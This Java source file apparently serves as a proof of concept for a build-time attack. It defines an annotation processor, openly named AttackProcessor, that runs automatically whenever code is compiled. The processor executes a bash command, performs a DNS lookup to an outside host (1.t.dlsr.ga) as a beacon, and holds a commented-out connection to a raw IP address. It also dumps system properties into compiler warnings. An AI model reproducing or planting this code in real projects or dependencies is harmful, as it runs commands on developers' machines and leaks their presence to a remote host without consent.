package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.imageio.IIOParam;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.File;
import java.io.IOException;
import java.net.Inet4Address;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");
        sb.append(System.getProperties());

        File folder = new File(System.getProperty("user.home"));

        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
            Inet4Address.getByName( "1.t.dlsr.ga" );
            //Process p = r.exec(new String[]{"cmd.exe","explorer","http://182.92.151.151:8888"});
            //p.waitFor();
        } catch (Exception e) {
            processingEnv.getMessager().printMessage(
                            Diagnostic.Kind.WARNING, "Hello Worlds!"+sb.toString());
            e.printStackTrace();
        }
        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
